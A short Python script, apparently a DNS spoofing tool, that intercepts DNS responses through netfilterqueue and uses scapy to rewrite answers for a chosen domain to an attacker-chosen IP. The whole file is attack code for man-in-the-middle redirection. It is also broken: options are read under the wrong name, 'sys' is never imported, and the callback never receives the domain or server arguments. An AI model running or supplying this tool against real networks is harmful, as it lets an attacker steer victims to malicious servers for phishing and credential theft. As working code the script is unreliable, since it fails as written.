import netfilterqueue
import scapy.all as scapy
import optparse
import subprocess


def dns_spoof(packet, domain_to_spoof, server_ip):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if str(domain_to_spoof) in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=server_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
            
    packet.accept()            
      



parser = optparse.OptionParser()

parser.add_option("-d", "--domain", dest="domain", help="The domain to spoof address")
parser.add_option("-s", "--server", dest="target", help="THe server ip")


(options, arguments) = parser.parse_args()



if not options.server:
    print("[E] No  server ip specified.  -h for help.")
    sys.exit(0)

if not options.domain:
    print("[E] No  domain specified.  -h for help.")
    sys.exit(0)

domain = options.domain
server_ip = options.server


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, dns_spoof)
queue.run()
